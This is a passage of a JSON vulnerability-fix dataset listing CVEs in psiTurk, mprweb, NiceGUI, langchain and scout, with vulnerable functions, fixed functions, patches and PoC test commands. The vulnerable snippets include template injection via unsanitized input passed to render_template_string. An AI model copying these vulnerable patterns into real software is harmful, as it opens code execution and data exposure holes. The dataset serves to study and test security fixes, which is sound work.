      }
    },
    "repo": "https://github.com/Clinical-Genomics/scout",
    "patch_url": [
      "https://github.com/Clinical-Genomics/scout/commit/f59e50f8ea596e641da8a0e9c7a33c0696bcbea5"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_381_1",
        "commit": "679c42e635d4554c630a0018420b163586f9ef48",
        "file_path": "scout/server/blueprints/panels/controllers.py",
        "start_line": 303,
        "end_line": 319,
        "snippet": "def downloaded_panel_name(panel_obj, format) -> str:\n    \"\"\"Return a string with the file name to be downloaded\n\n    Args:\n        panel_obj(dict): scout.models.panel.gene_panel\n        format(str): \"pdf\" or \"txt\"\n    Returns:\n        a string describing the panel\n    \"\"\"\n    return \"_\".join(\n        [\n            panel_obj[\"panel_name\"],\n            str(panel_obj[\"version\"]),\n            dt.datetime.now().strftime(DATE_DAY_FORMATTER),\n            f\"scout.{format}\",\n        ]\n    )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_381_1",
        "commit": "f59e50f8ea596e641da8a0e9c7a33c0696bcbea5",
        "file_path": "scout/server/blueprints/panels/controllers.py",
        "start_line": 304,
        "end_line": 322,
        "snippet": "def downloaded_panel_name(panel_obj, format) -> str:\n    \"\"\"Return a string with the file name to be downloaded\n\n    Args:\n        panel_obj(dict): scout.models.panel.gene_panel\n        format(str): \"pdf\" or \"txt\"\n    Returns:\n        a string describing the panel\n    \"\"\"\n    sanitized_panel_id = re.sub(r\"[^a-zA-Z_\\-]+\", \"\", panel_obj[\"panel_name\"])\n\n    return \"_\".join(\n        [\n            sanitized_panel_id,\n            str(panel_obj[\"version\"]),\n            dt.datetime.now().strftime(DATE_DAY_FORMATTER),\n            f\"scout.{format}\",\n        ]\n    )"
      }
    ],
    "vul_patch": "--- a/scout/server/blueprints/panels/controllers.py\n+++ b/scout/server/blueprints/panels/controllers.py\n@@ -7,9 +7,11 @@\n     Returns:\n         a string describing the panel\n     \"\"\"\n+    sanitized_panel_id = re.sub(r\"[^a-zA-Z_\\-]+\", \"\", panel_obj[\"panel_name\"])\n+\n     return \"_\".join(\n         [\n-            panel_obj[\"panel_name\"],\n+            sanitized_panel_id,\n             str(panel_obj[\"version\"]),\n             dt.datetime.now().strftime(DATE_DAY_FORMATTER),\n             f\"scout.{format}\",\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-4315",
    "cve_description": "A vulnerability has been found in NYUCCL psiTurk up to 3.2.0 and classified as critical. This vulnerability affects unknown code of the file psiturk/experiment.py. The manipulation of the argument mode leads to improper neutralization of special elements used in a template engine. The exploit has been disclosed to the public and may be used. Upgrading to version 3.2.1 is able to address this issue. The name of the patch is 47787e15cecd66f2aa87687bf852ae0194a4335f. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-219676.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/NYUCCL/psiTurk",
    "patch_url": [
      "https://github.com/NYUCCL/psiTurk/commit/47787e15cecd66f2aa87687bf852ae0194a4335f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_34_1",
        "commit": "231d566",
        "file_path": "psiturk/experiment.py",
        "start_line": 287,
        "end_line": 391,
        "snippet": "def advertisement():\n    \"\"\"\n    This is the url we give for the ad for our 'external question'.  The ad has\n    to display two different things: This page will be called from within\n    mechanical turk, with url arguments hitId, assignmentId, and workerId.\n    If the worker has not yet accepted the hit:\n        These arguments will have null values, we should just show an ad for\n        the experiment.\n    If the worker has accepted the hit:\n        These arguments will have appropriate values and we should enter the\n        person in the database and provide a link to the experiment popup.\n    \"\"\"\n    user_agent_string = request.user_agent.string\n    user_agent_obj = user_agents.parse(user_agent_string)\n    browser_ok = True\n    browser_exclude_rule = CONFIG.get('Task Parameters', 'browser_exclude_rule')\n    for rule in browser_exclude_rule.split(','):\n        myrule = rule.strip()\n        if myrule in [\"mobile\", \"tablet\", \"touchcapable\", \"pc\", \"bot\"]:\n            if (myrule == \"mobile\" and user_agent_obj.is_mobile) or\\\n               (myrule == \"tablet\" and user_agent_obj.is_tablet) or\\\n               (myrule == \"touchcapable\" and user_agent_obj.is_touch_capable) or\\\n               (myrule == \"pc\" and user_agent_obj.is_pc) or\\\n               (myrule == \"bot\" and user_agent_obj.is_bot):\n                browser_ok = False\n        elif myrule == \"Safari\" or myrule == \"safari\":\n            if \"Chrome\" in user_agent_string and \"Safari\" in user_agent_string:\n                pass\n            elif \"Safari\" in user_agent_string:\n                browser_ok = False\n        elif myrule in user_agent_string:\n            browser_ok = False\n\n    if not browser_ok:\n        # Handler for IE users if IE is not supported.\n        raise ExperimentError('browser_type_not_allowed')\n\n    if not ('hitId' in request.args and 'assignmentId' in request.args):\n        raise ExperimentError('hit_assign_worker_id_not_set_in_mturk')\n    hit_id = request.args['hitId']\n    assignment_id = request.args['assignmentId']\n    mode = request.args['mode']\n    if hit_id[:5] == \"debug\":\n        debug_mode = True\n    else:\n        debug_mode = False\n    already_in_db = False\n    if 'workerId' in request.args:\n        worker_id = request.args['workerId']\n        # First check if this workerId has completed the task before (v1).\n        nrecords = Participant.query.\\\n            filter(Participant.assignmentid != assignment_id).\\\n            filter(Participant.workerid == worker_id).\\\n            count()\n\n        if nrecords > 0:  # Already completed task\n            already_in_db = True\n    else:  # If worker has not accepted the hit\n        worker_id = None\n    try:\n        part = Participant.query.\\\n            filter(Participant.hitid == hit_id).\\\n            filter(Participant.assignmentid == assignment_id).\\\n            filter(Participant.workerid == worker_id).\\\n            one()\n        status = part.status\n    except exc.SQLAlchemyError:\n        status = None\n\n    allow_repeats = CONFIG.getboolean('Task Parameters', 'allow_repeats')\n    if (status == STARTED or status == QUITEARLY) and not debug_mode:\n        # Once participants have finished the instructions, we do not allow\n        # them to start the task again.\n        raise ExperimentError('already_started_exp_mturk')\n    elif status == COMPLETED or (status == SUBMITTED and not already_in_db):\n        # 'or status == SUBMITTED' because we suspect that sometimes the post\n        # to mturk fails after we've set status to SUBMITTED, so really they\n        # have not successfully submitted. This gives another chance for the\n        # submit to work.\n\n        # They've finished the experiment but haven't successfully submitted the HIT\n        # yet.\n        return render_template(\n            'thanks-mturksubmit.html',\n            using_sandbox=(mode == \"sandbox\"),\n            hitid=hit_id,\n            assignmentid=assignment_id,\n            workerid=worker_id\n        )\n    elif already_in_db and not (debug_mode or allow_repeats):\n        raise ExperimentError('already_did_exp_hit')\n    elif status == ALLOCATED or not status or debug_mode:\n        # Participant has not yet agreed to the consent. They might not\n        # even have accepted the HIT.\n        with open('templates/ad.html', 'r') as temp_file:\n            ad_string = temp_file.read()\n        ad_string = insert_mode(ad_string, mode)\n        return render_template_string(\n            ad_string,\n            hitid=hit_id,\n            assignmentid=assignment_id,\n            workerid=worker_id\n        )\n    else:\n        raise ExperimentError('status_incorrectly_set')"
      },
      {
        "id": "vul_py_34_2",
        "commit": "231d566",
        "file_path": "psiturk/experiment.py",
        "start_line": 396,
        "end_line": 415,
        "snippet": "def give_consent():\n    \"\"\"\n    Serves up the consent in the popup window.\n    \"\"\"\n    if not ('hitId' in request.args and 'assignmentId' in request.args and\n            'workerId' in request.args):\n        raise ExperimentError('hit_assign_worker_id_not_set_in_consent')\n    hit_id = request.args['hitId']\n    assignment_id = request.args['assignmentId']\n    worker_id = request.args['workerId']\n    mode = request.args['mode']\n    with open('templates/consent.html', 'r') as temp_file:\n        consent_string = temp_file.read()\n    consent_string = insert_mode(consent_string, mode)\n    return render_template_string(\n        consent_string,\n        hitid=hit_id,\n        assignmentid=assignment_id,\n        workerid=worker_id\n    )"
      },
      {
        "id": "vul_py_34_3",
        "commit": "231d566",
        "file_path": "psiturk/experiment.py",
        "start_line": 734,
        "end_line": 747,
        "snippet": "def insert_mode(page_html, mode):\n    \"\"\" Insert mode \"\"\"\n    page_html = page_html\n    match_found = False\n    matches = re.finditer('workerId={{ workerid }}', page_html)\n    match = None\n    for match in matches:\n        match_found = True\n    if match_found:\n        new_html = page_html[:match.end()] + \"&mode=\" + mode +\\\n            page_html[match.end():]\n        return new_html\n    else:\n        raise ExperimentError(\"insert_mode_failed\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_34_1",
        "commit": "47787e15cecd66f2aa87687bf852ae0194a4335f",
        "file_path": "psiturk/experiment.py",
        "start_line": 287,
        "end_line": 392,
        "snippet": "def advertisement():\n    \"\"\"\n    This is the url we give for the ad for our 'external question'.  The ad has\n    to display two different things: This page will be called from within\n    mechanical turk, with url arguments hitId, assignmentId, and workerId.\n    If the worker has not yet accepted the hit:\n        These arguments will have null values, we should just show an ad for\n        the experiment.\n    If the worker has accepted the hit:\n        These arguments will have appropriate values and we should enter the\n        person in the database and provide a link to the experiment popup.\n    \"\"\"\n    user_agent_string = request.user_agent.string\n    user_agent_obj = user_agents.parse(user_agent_string)\n    browser_ok = True\n    browser_exclude_rule = CONFIG.get('Task Parameters', 'browser_exclude_rule')\n    for rule in browser_exclude_rule.split(','):\n        myrule = rule.strip()\n        if myrule in [\"mobile\", \"tablet\", \"touchcapable\", \"pc\", \"bot\"]:\n            if (myrule == \"mobile\" and user_agent_obj.is_mobile) or\\\n               (myrule == \"tablet\" and user_agent_obj.is_tablet) or\\\n               (myrule == \"touchcapable\" and user_agent_obj.is_touch_capable) or\\\n               (myrule == \"pc\" and user_agent_obj.is_pc) or\\\n               (myrule == \"bot\" and user_agent_obj.is_bot):\n                browser_ok = False\n        elif myrule == \"Safari\" or myrule == \"safari\":\n            if \"Chrome\" in user_agent_string and \"Safari\" in user_agent_string:\n                pass\n            elif \"Safari\" in user_agent_string:\n                browser_ok = False\n        elif myrule in user_agent_string:\n            browser_ok = False\n\n    if not browser_ok:\n        # Handler for IE users if IE is not supported.\n        raise ExperimentError('browser_type_not_allowed')\n\n    if not ('hitId' in request.args and 'assignmentId' in request.args):\n        raise ExperimentError('hit_assign_worker_id_not_set_in_mturk')\n    hit_id = request.args['hitId']\n    assignment_id = request.args['assignmentId']\n    mode = request.args['mode']\n    if hit_id[:5] == \"debug\":\n        debug_mode = True\n    else:\n        debug_mode = False\n    already_in_db = False\n    if 'workerId' in request.args:\n        worker_id = request.args['workerId']\n        # First check if this workerId has completed the task before (v1).\n        nrecords = Participant.query.\\\n            filter(Participant.assignmentid != assignment_id).\\\n            filter(Participant.workerid == worker_id).\\\n            count()\n\n        if nrecords > 0:  # Already completed task\n            already_in_db = True\n    else:  # If worker has not accepted the hit\n        worker_id = None\n    try:\n        part = Participant.query.\\\n            filter(Participant.hitid == hit_id).\\\n            filter(Participant.assignmentid == assignment_id).\\\n            filter(Participant.workerid == worker_id).\\\n            one()\n        status = part.status\n    except exc.SQLAlchemyError:\n        status = None\n\n    allow_repeats = CONFIG.getboolean('Task Parameters', 'allow_repeats')\n    if (status == STARTED or status == QUITEARLY) and not debug_mode:\n        # Once participants have finished the instructions, we do not allow\n        # them to start the task again.\n        raise ExperimentError('already_started_exp_mturk')\n    elif status == COMPLETED or (status == SUBMITTED and not already_in_db):\n        # 'or status == SUBMITTED' because we suspect that sometimes the post\n        # to mturk fails after we've set status to SUBMITTED, so really they\n        # have not successfully submitted. This gives another chance for the\n        # submit to work.\n\n        # They've finished the experiment but haven't successfully submitted the HIT\n        # yet.\n        return render_template(\n            'thanks-mturksubmit.html',\n            using_sandbox=(mode == \"sandbox\"),\n            hitid=hit_id,\n            assignmentid=assignment_id,\n            workerid=worker_id\n        )\n    elif already_in_db and not (debug_mode or allow_repeats):\n        raise ExperimentError('already_did_exp_hit')\n    elif status == ALLOCATED or not status or debug_mode:\n        # Participant has not yet agreed to the consent. They might not\n        # even have accepted the HIT.\n        with open('templates/ad.html', 'r') as temp_file:\n            ad_string = temp_file.read()\n        ad_string = insert_mode(ad_string)\n        return render_template_string(\n            ad_string,\n            mode=mode,\n            hitid=hit_id,\n            assignmentid=assignment_id,\n            workerid=worker_id\n        )\n    else:\n        raise ExperimentError('status_incorrectly_set')"
      },
      {
        "id": "fix_py_34_2",
        "commit": "47787e15cecd66f2aa87687bf852ae0194a4335f",
        "file_path": "psiturk/experiment.py",
        "start_line": 397,
        "end_line": 417,
        "snippet": "def give_consent():\n    \"\"\"\n    Serves up the consent in the popup window.\n    \"\"\"\n    if not ('hitId' in request.args and 'assignmentId' in request.args and\n            'workerId' in request.args):\n        raise ExperimentError('hit_assign_worker_id_not_set_in_consent')\n    hit_id = request.args['hitId']\n    assignment_id = request.args['assignmentId']\n    worker_id = request.args['workerId']\n    mode = request.args['mode']\n    with open('templates/consent.html', 'r') as temp_file:\n        consent_string = temp_file.read()\n    consent_string = insert_mode(consent_string)\n    return render_template_string(\n        consent_string,\n        mode=mode,\n        hitid=hit_id,\n        assignmentid=assignment_id,\n        workerid=worker_id\n    )"
      },
      {
        "id": "fix_py_34_3",
        "commit": "47787e15cecd66f2aa87687bf852ae0194a4335f",
        "file_path": "psiturk/experiment.py",
        "start_line": 736,
        "end_line": 749,
        "snippet": "def insert_mode(page_html):\n    \"\"\" Insert mode \"\"\"\n    page_html = page_html\n    match_found = False\n    matches = re.finditer('workerId={{ workerid }}', page_html)\n    match = None\n    for match in matches:\n        match_found = True\n    if match_found:\n        new_html = page_html[:match.end()] + '&mode={{ mode }}' +\\\n            page_html[match.end():]\n        return new_html\n    else:\n        raise ExperimentError(\"insert_mode_failed\")"
      }
    ],
    "vul_patch": "--- a/psiturk/experiment.py\n+++ b/psiturk/experiment.py\n@@ -94,9 +94,10 @@\n         # even have accepted the HIT.\n         with open('templates/ad.html', 'r') as temp_file:\n             ad_string = temp_file.read()\n-        ad_string = insert_mode(ad_string, mode)\n+        ad_string = insert_mode(ad_string)\n         return render_template_string(\n             ad_string,\n+            mode=mode,\n             hitid=hit_id,\n             assignmentid=assignment_id,\n             workerid=worker_id\n\n--- a/psiturk/experiment.py\n+++ b/psiturk/experiment.py\n@@ -1,3 +1,4 @@\n+def give_consent():\n     \"\"\"\n     Serves up the consent in the popup window.\n     \"\"\"\n@@ -10,9 +11,10 @@\n     mode = request.args['mode']\n     with open('templates/consent.html', 'r') as temp_file:\n         consent_string = temp_file.read()\n-    consent_string = insert_mode(consent_string, mode)\n+    consent_string = insert_mode(consent_string)\n     return render_template_string(\n         consent_string,\n+        mode=mode,\n         hitid=hit_id,\n         assignmentid=assignment_id,\n         workerid=worker_id\n\n--- a/psiturk/experiment.py\n+++ b/psiturk/experiment.py\n@@ -1,4 +1,4 @@\n-def insert_mode(page_html, mode):\n+def insert_mode(page_html):\n     \"\"\" Insert mode \"\"\"\n     page_html = page_html\n     match_found = False\n@@ -7,7 +7,7 @@\n     for match in matches:\n         match_found = True\n     if match_found:\n-        new_html = page_html[:match.end()] + \"&mode=\" + mode +\\\n+        new_html = page_html[:match.end()] + '&mode={{ mode }}' +\\\n             page_html[match.end():]\n         return new_html\n     else:\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-4315:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/psiTurk\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\nPYTHONPATH=. /workspace/PoC_env/CVE-2021-4315/bin/python -m pytest tests/test_psiturk.py -k \"test_insert_mode\" --override-ini=\"addopts=\" -p no:warning --disable-warnings\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-4315:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/psiTurk\ngit apply --whitespace=nowarn /workspace/fix.patch\nPYTHONPATH=. /workspace/PoC_env/CVE-2021-4315/bin/python -m pytest tests/test_psiturk.py -k \"not test_insert_mode\" --override-ini=\"addopts=\" -p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2022-31185",
    "cve_description": "mprweb is a hosting platform for the makedeb Package Repository. Email addresses were found to not have been hidden, even if a user had clicked the `Hide Email Address` checkbox on their account page, or during signup. This could lead to an account's email being leaked, which may be problematic if your email needs to remain private for any reason. Users hosting their own mprweb instance will need to upgrade to the latest commit to get this fixed. Users on the official instance will already have this issue fixed.",
    "cwe_info": {
      "CWE-200": {
        "name": "Exposure of Sensitive Information to an Unauthorized Actor",
        "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
      }
    },
    "repo": "https://github.com/makedeb/mprweb",
    "patch_url": [
      "https://github.com/makedeb/mprweb/commit/d13e3f2f5a9c0b0f6782f35d837090732026ad77"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_213_1",
        "commit": "908b81a",
        "file_path": "aurweb/routers/accounts.py",
        "start_line": 269,
        "end_line": 357,
        "snippet": "async def account_register_post(\n    request: Request,\n    U: str = Form(default=str()),  # Username\n    E: str = Form(default=str()),  # Email\n    H: str = Form(default=False),  # Hide Email\n    BE: str = Form(default=None),  # Backup Email\n    R: str = Form(default=\"\"),  # Real Name\n    HP: str = Form(default=None),  # Homepage\n    I: str = Form(default=None),  # IRC Nick # noqa: E741\n    K: str = Form(default=None),  # PGP Key\n    L: str = Form(default=aurweb.config.get(\"options\", \"default_lang\")),\n    TZ: str = Form(default=aurweb.config.get(\"options\", \"default_timezone\")),\n    PK: str = Form(default=None),  # SSH PubKey\n    CN: bool = Form(default=False),\n    UN: bool = Form(default=False),\n    ON: bool = Form(default=False),\n    captcha: str = Form(default=None),\n    captcha_salt: str = Form(...),\n):\n    context = await make_variable_context(request, \"Register\")\n    args = dict(await request.form())\n\n    context = make_account_form_context(context, request, None, args)\n    ok, errors = process_account_form(request, request.user, args)\n    if not ok:\n        # If the field values given do not meet the requirements,\n        # return HTTP 400 with an error.\n        context[\"errors\"] = errors\n        return render_template(\n            request, \"register.html\", context, status_code=HTTPStatus.BAD_REQUEST\n        )\n\n    if not captcha:\n        context[\"errors\"] = [\"The CAPTCHA is missing.\"]\n        return render_template(\n            request, \"register.html\", context, status_code=HTTPStatus.BAD_REQUEST\n        )\n\n    # Create a user with no password with a resetkey, then send\n    # an email off about it.\n    resetkey = generate_resetkey()\n\n    # By default, we grab the User account type to associate with.\n    atype = db.query(\n        models.AccountType, models.AccountType.AccountType == \"User\"\n    ).first()\n\n    # Create a user given all parameters available.\n    with db.begin():\n        user = db.create(\n            models.User,\n            Username=U,\n            Email=E,\n            HideEmail=H,\n            BackupEmail=BE,\n            RealName=R,\n            Homepage=HP,\n            IRCNick=I,\n            PGPKey=K,\n            LangPreference=L,\n            Timezone=TZ,\n            CommentNotify=CN,\n            UpdateNotify=UN,\n            OwnershipNotify=ON,\n            ResetKey=resetkey,\n            AccountType=atype,\n        )\n\n    # If a PK was given and either one does not exist or the given\n    # PK mismatches the existing user's SSHPubKey.PubKey.\n    if PK:\n        # Get the second element in the PK, which is the actual key.\n        pubkey = PK.strip().rstrip()\n        parts = pubkey.split(\" \")\n        if len(parts) == 3:\n            # Remove the host part.\n            pubkey = parts[0] + \" \" + parts[1]\n        fingerprint = get_fingerprint(pubkey)\n        with db.begin():\n            user.ssh_pub_key = models.SSHPubKey(\n                UserID=user.ID, PubKey=pubkey, Fingerprint=fingerprint\n            )\n\n    # Send a reset key notification to the new user.\n    WelcomeNotification(user.ID).send()\n\n    context[\"complete\"] = True\n    context[\"user\"] = user\n    return render_template(request, \"register.html\", context)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_213_1",
        "commit": "d13e3f2",
        "file_path": "aurweb/routers/accounts.py",
        "start_line": 269,
        "end_line": 363,
        "snippet": "async def account_register_post(\n    request: Request,\n    U: str = Form(default=str()),  # Username\n    E: str = Form(default=str()),  # Email\n    H: str = Form(default=\"off\"),  # Hide Email\n    BE: str = Form(default=None),  # Backup Email\n    R: str = Form(default=\"\"),  # Real Name\n    HP: str = Form(default=None),  # Homepage\n    I: str = Form(default=None),  # IRC Nick # noqa: E741\n    K: str = Form(default=None),  # PGP Key\n    L: str = Form(default=aurweb.config.get(\"options\", \"default_lang\")),\n    TZ: str = Form(default=aurweb.config.get(\"options\", \"default_timezone\")),\n    PK: str = Form(default=None),  # SSH PubKey\n    CN: bool = Form(default=False),\n    UN: bool = Form(default=False),\n    ON: bool = Form(default=False),\n    captcha: str = Form(default=None),\n    captcha_salt: str = Form(...),\n):\n    context = await make_variable_context(request, \"Register\")\n    args = dict(await request.form())\n\n    context = make_account_form_context(context, request, None, args)\n    ok, errors = process_account_form(request, request.user, args)\n    if not ok:\n        # If the field values given do not meet the requirements,\n        # return HTTP 400 with an error.\n        context[\"errors\"] = errors\n        return render_template(\n            request, \"register.html\", context, status_code=HTTPStatus.BAD_REQUEST\n        )\n\n    if not captcha:\n        context[\"errors\"] = [\"The CAPTCHA is missing.\"]\n        return render_template(\n            request, \"register.html\", context, status_code=HTTPStatus.BAD_REQUEST\n        )\n\n    # Create a user with no password with a resetkey, then send\n    # an email off about it.\n    resetkey = generate_resetkey()\n\n    # By default, we grab the User account type to associate with.\n    atype = db.query(\n        models.AccountType, models.AccountType.AccountType == \"User\"\n    ).first()\n\n    # Check if we should turn on HideEmail.\n    if H == \"on\":\n        hide_email = 1\n    else:\n        hide_email = 0\n\n    # Create a user given all parameters available.\n    with db.begin():\n        user = db.create(\n            models.User,\n            Username=U,\n            Email=E,\n            HideEmail=hide_email,\n            BackupEmail=BE,\n            RealName=R,\n            Homepage=HP,\n            IRCNick=I,\n            PGPKey=K,\n            LangPreference=L,\n            Timezone=TZ,\n            CommentNotify=CN,\n            UpdateNotify=UN,\n            OwnershipNotify=ON,\n            ResetKey=resetkey,\n            AccountType=atype,\n        )\n\n    # If a PK was given and either one does not exist or the given\n    # PK mismatches the existing user's SSHPubKey.PubKey.\n    if PK:\n        # Get the second element in the PK, which is the actual key.\n        pubkey = PK.strip().rstrip()\n        parts = pubkey.split(\" \")\n        if len(parts) == 3:\n            # Remove the host part.\n            pubkey = parts[0] + \" \" + parts[1]\n        fingerprint = get_fingerprint(pubkey)\n        with db.begin():\n            user.ssh_pub_key = models.SSHPubKey(\n                UserID=user.ID, PubKey=pubkey, Fingerprint=fingerprint\n            )\n\n    # Send a reset key notification to the new user.\n    WelcomeNotification(user.ID).send()\n\n    context[\"complete\"] = True\n    context[\"user\"] = user\n    return render_template(request, \"register.html\", context)"
      }
    ],
    "vul_patch": "--- a/aurweb/routers/accounts.py\n+++ b/aurweb/routers/accounts.py\n@@ -2,7 +2,7 @@\n     request: Request,\n     U: str = Form(default=str()),  # Username\n     E: str = Form(default=str()),  # Email\n-    H: str = Form(default=False),  # Hide Email\n+    H: str = Form(default=\"off\"),  # Hide Email\n     BE: str = Form(default=None),  # Backup Email\n     R: str = Form(default=\"\"),  # Real Name\n     HP: str = Form(default=None),  # Homepage\n@@ -45,13 +45,19 @@\n         models.AccountType, models.AccountType.AccountType == \"User\"\n     ).first()\n \n+    # Check if we should turn on HideEmail.\n+    if H == \"on\":\n+        hide_email = 1\n+    else:\n+        hide_email = 0\n+\n     # Create a user given all parameters available.\n     with db.begin():\n         user = db.create(\n             models.User,\n             Username=U,\n             Email=E,\n-            HideEmail=H,\n+            HideEmail=hide_email,\n             BackupEmail=BE,\n             RealName=R,\n             Homepage=HP,\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2025-21618",
    "cve_description": "NiceGUI is an easy-to-use, Python-based UI framework. Prior to 2.9.1, authenticating with NiceGUI logged in the user for all browsers, including browsers in incognito mode. This vulnerability is fixed in 2.9.1.",
    "cwe_info": {
      "CWE-287": {
        "name": "Improper Authentication",
        "description": "When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct."
      }
    },
    "repo": "https://github.com/zauberzeug/nicegui",
    "patch_url": [
      "https://github.com/zauberzeug/nicegui/commit/1621a4ba6a06676b8094362d36623551e651adc1"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_358_1",
        "commit": "c063791b21a51dc966da654bd9545e9c5506fa8f",
        "file_path": "nicegui/air.py",
        "start_line": 50,
        "end_line": 77,
        "snippet": "        async def _handle_http(data: Dict[str, Any]) -> Dict[str, Any]:\n            headers: Dict[str, Any] = data['headers']\n            headers.update({'Accept-Encoding': 'identity', 'X-Forwarded-Prefix': data['prefix']})\n            url = 'http://test' + data['path']\n            request = self.client.build_request(\n                data['method'],\n                url,\n                params=data['params'],\n                headers=headers,\n                content=data['body'],\n            )\n            response = await self.client.send(request)\n            instance_id = data['instance-id']\n            content = response.content.replace(\n                b'const extraHeaders = {};',\n                (f'const extraHeaders = {{ \"fly-force-instance-id\" : \"{instance_id}\" }};').encode(),\n            )\n            match = re.search(b'const query = ({.*?})', content)\n            if match:\n                new_js_object = match.group(1).decode().rstrip('}') + \", 'fly_instance_id' : '\" + instance_id + \"'}\"\n                content = content.replace(match.group(0), f'const query = {new_js_object}'.encode())\n            compressed = gzip.compress(content)\n            response.headers.update({'content-encoding': 'gzip', 'content-length': str(len(compressed))})\n            return {\n                'status_code': response.status_code,\n                'headers': response.headers.multi_items(),\n                'content': compressed,\n            }"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_358_1",
        "commit": "1621a4ba6a06676b8094362d36623551e651adc1",
        "file_path": "nicegui/air.py",
        "start_line": 50,
        "end_line": 78,
        "snippet": "        async def _handle_http(data: Dict[str, Any]) -> Dict[str, Any]:\n            headers: Dict[str, Any] = data['headers']\n            headers.update({'Accept-Encoding': 'identity', 'X-Forwarded-Prefix': data['prefix']})\n            url = 'http://test' + data['path']\n            request = self.client.build_request(\n                data['method'],\n                url,\n                params=data['params'],\n                headers=headers,\n                content=data['body'],\n            )\n            response = await self.client.send(request)\n            self.client.cookies.clear()\n            instance_id = data['instance-id']\n            content = response.content.replace(\n                b'const extraHeaders = {};',\n                (f'const extraHeaders = {{ \"fly-force-instance-id\" : \"{instance_id}\" }};').encode(),\n            )\n            match = re.search(b'const query = ({.*?})', content)\n            if match:\n                new_js_object = match.group(1).decode().rstrip('}') + \", 'fly_instance_id' : '\" + instance_id + \"'}\"\n                content = content.replace(match.group(0), f'const query = {new_js_object}'.encode())\n            compressed = gzip.compress(content)\n            response.headers.update({'content-encoding': 'gzip', 'content-length': str(len(compressed))})\n            return {\n                'status_code': response.status_code,\n                'headers': response.headers.multi_items(),\n                'content': compressed,\n            }"
      }
    ],
    "vul_patch": "--- a/nicegui/air.py\n+++ b/nicegui/air.py\n@@ -10,6 +10,7 @@\n                 content=data['body'],\n             )\n             response = await self.client.send(request)\n+            self.client.cookies.clear()\n             instance_id = data['instance-id']\n             content = response.content.replace(\n                 b'const extraHeaders = {};',\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-36281",
    "cve_description": "An issue in langchain v.0.0.171 allows a remote attacker to execute arbitrary code via a JSON file to load_prompt. This is related to __subclasses__ or a template.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/langchain-ai/langchain",
    "patch_url": [
      "https://github.com/langchain-ai/langchain/commit/22abeb9f6cc555591bf8e92b5e328e43aa07ff6c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_303_1",
        "commit": "b642d00",
        "file_path": "libs/langchain/langchain/prompts/loading.py",
        "start_line": 111,
        "end_line": 116,
        "snippet": "def _load_prompt(config: dict) -> PromptTemplate:\n    \"\"\"Load the prompt template from config.\"\"\"\n    # Load the template from disk if necessary.\n    config = _load_template(\"template\", config)\n    config = _load_output_parser(config)\n    return PromptTemplate(**config)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_303_1",
        "commit": "22abeb9f6cc555591bf8e92b5e328e43aa07ff6c",
        "file_path": "libs/langchain/langchain/prompts/loading.py",
        "start_line": 111,
        "end_line": 127,
        "snippet": "def _load_prompt(config: dict) -> PromptTemplate:\n    \"\"\"Load the prompt template from config.\"\"\"\n    # Load the template from disk if necessary.\n    config = _load_template(\"template\", config)\n    config = _load_output_parser(config)\n\n    template_format = config.get(\"template_format\", \"f-string\")\n    if template_format == \"jinja2\":\n        # Disabled due to:\n        # https://github.com/langchain-ai/langchain/issues/4394\n        raise ValueError(\n            f\"Loading templates with '{template_format}' format is no longer supported \"\n            f\"since it can lead to arbitrary code execution. Please migrate to using \"\n            f\"the 'f-string' template format, which does not suffer from this issue.\"\n        )\n\n    return PromptTemplate(**config)"
      }
    ],
